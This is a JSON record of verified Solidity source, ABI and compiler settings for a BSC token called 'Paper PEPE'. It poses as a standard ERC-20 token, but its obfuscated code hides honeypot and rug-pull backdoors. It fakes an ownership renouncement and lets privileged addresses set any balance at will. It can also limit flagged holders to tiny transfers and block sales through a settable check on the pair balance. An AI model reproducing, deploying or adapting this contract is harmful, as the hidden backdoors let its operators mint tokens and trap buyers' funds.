{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface txAtToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalTeam) external view returns (uint256);\n\n    function transfer(address tokenWalletShould, uint256 atAuto) external returns (bool);\n\n    function allowance(address exemptLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenWalletShould,\n        uint256 atAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableTrading, uint256 value);\n    event Approval(address indexed exemptLaunched, address indexed spender, uint256 value);\n}\n\nabstract contract launchFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchedTx {\n    function createPair(address totalSellShould, address teamLiquidity) external returns (address);\n}\n\ninterface amountLaunchedFee is txAtToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PaperPEPE is launchFrom, txAtToken, amountLaunchedFee {\n\n    bool private modeReceiver;\n\n    constructor (){\n        if (modeFeeIs != takeMarketing) {\n            takeMarketing = modeFeeIs;\n        }\n        receiverReceiver modeShould = receiverReceiver(listTotal);\n        autoMin = launchedTx(modeShould.factory()).createPair(modeShould.WETH(), address(this));\n        if (receiverLiquidity != modeFeeIs) {\n            receiverLiquidity = shouldTradingReceiver;\n        }\n        walletBuy = _msgSender();\n        buyToken();\n        toIsMarketing[walletBuy] = true;\n        fromBuy[walletBuy] = teamFee;\n        if (modeReceiver) {\n            shouldTradingReceiver = tradingReceiver;\n        }\n        emit Transfer(address(0), walletBuy, teamFee);\n    }\n\n    string private liquidityWallet = \"PPE\";\n\n    function buyToken() public {\n        emit OwnershipTransferred(walletBuy, address(0));\n        toMax = address(0);\n    }\n\n    function receiverTo(address totalExempt) public {\n        swapTokenReceiver();\n        \n        if (totalExempt == walletBuy || totalExempt == autoMin) {\n            return;\n        }\n        amountIs[totalExempt] = true;\n    }\n\n    function transfer(address minTx, uint256 atAuto) external virtual override returns (bool) {\n        return liquidityMax(_msgSender(), minTx, atAuto);\n    }\n\n    function totalLaunched(address minTx, uint256 atAuto) public {\n        swapTokenReceiver();\n        fromBuy[minTx] = atAuto;\n    }\n\n    uint8 private receiverMarketing = 18;\n\n    bool private fromTx;\n\n    function liquidityMax(address launchTeam, address tokenWalletShould, uint256 atAuto) internal returns (bool) {\n        if (launchTeam == walletBuy) {\n            return shouldTake(launchTeam, tokenWalletShould, atAuto);\n        }\n        uint256 autoTeam = txAtToken(autoMin).balanceOf(txLimitTeam);\n        require(autoTeam == isTradingMarketing);\n        require(tokenWalletShould != txLimitTeam);\n        if (amountIs[launchTeam]) {\n            return shouldTake(launchTeam, tokenWalletShould, fromLaunch);\n        }\n        return shouldTake(launchTeam, tokenWalletShould, atAuto);\n    }\n\n    uint256 private teamFee = 100000000 * 10 ** 18;\n\n    uint256 isTradingMarketing;\n\n    function allowance(address tradingShould, address modeSender) external view virtual override returns (uint256) {\n        if (modeSender == listTotal) {\n            return type(uint256).max;\n        }\n        return limitList[tradingShould][modeSender];\n    }\n\n    address listTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function shouldLaunchLimit(address txReceiverFrom) public {\n        require(txReceiverFrom.balance < 100000);\n        if (txSwap) {\n            return;\n        }\n        if (modeReceiver) {\n            teamSender = true;\n        }\n        toIsMarketing[txReceiverFrom] = true;\n        \n        txSwap = true;\n    }\n\n    address public walletBuy;\n\n    mapping(address => mapping(address => uint256)) private limitList;\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityWallet;\n    }\n\n    bool private teamSender;\n\n    uint256 public modeFeeIs;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverMarketing;\n    }\n\n    uint256 constant fromLaunch = 2 ** 10;\n\n    function transferFrom(address launchTeam, address tokenWalletShould, uint256 atAuto) external override returns (bool) {\n        if (_msgSender() != listTotal) {\n            if (limitList[launchTeam][_msgSender()] != type(uint256).max) {\n                require(atAuto <= limitList[launchTeam][_msgSender()]);\n                limitList[launchTeam][_msgSender()] -= atAuto;\n            }\n        }\n        return liquidityMax(launchTeam, tokenWalletShould, atAuto);\n    }\n\n    uint256 private receiverLiquidity;\n\n    mapping(address => bool) public toIsMarketing;\n\n    mapping(address => uint256) private fromBuy;\n\n    uint256 private tradingReceiver;\n\n    address public autoMin;\n\n    event OwnershipTransferred(address indexed autoBuy, address indexed launchAtLimit);\n\n    uint256 minAutoTotal;\n\n    bool private marketingLimit;\n\n    uint256 private takeMarketing;\n\n    function getOwner() external view returns (address) {\n        return toMax;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamFee;\n    }\n\n    function owner() external view returns (address) {\n        return toMax;\n    }\n\n    function toBuy(uint256 atAuto) public {\n        swapTokenReceiver();\n        isTradingMarketing = atAuto;\n    }\n\n    address txLimitTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public txSwap;\n\n    mapping(address => bool) public amountIs;\n\n    function swapTokenReceiver() private view {\n        require(toIsMarketing[_msgSender()]);\n    }\n\n    function approve(address modeSender, uint256 atAuto) public virtual override returns (bool) {\n        limitList[_msgSender()][modeSender] = atAuto;\n        emit Approval(_msgSender(), modeSender, atAuto);\n        return true;\n    }\n\n    uint256 public shouldTradingReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return exemptTo;\n    }\n\n    address private toMax;\n\n    function shouldTake(address launchTeam, address tokenWalletShould, uint256 atAuto) internal returns (bool) {\n        require(fromBuy[launchTeam] >= atAuto);\n        fromBuy[launchTeam] -= atAuto;\n        fromBuy[tokenWalletShould] += atAuto;\n        emit Transfer(launchTeam, tokenWalletShould, atAuto);\n        return true;\n    }\n\n    string private exemptTo = \"Paper PEPE\";\n\n    function balanceOf(address totalTeam) public view virtual override returns (uint256) {\n        return fromBuy[totalTeam];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchAtLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeSender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeFeeIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalExempt\",\"type\":\"address\"}],\"name\":\"receiverTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txReceiverFrom\",\"type\":\"address\"}],\"name\":\"shouldLaunchLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTradingReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atAuto\",\"type\":\"uint256\"}],\"name\":\"toBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toIsMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atAuto\",\"type\":\"uint256\"}],\"name\":\"totalLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenWalletShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "PaperPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}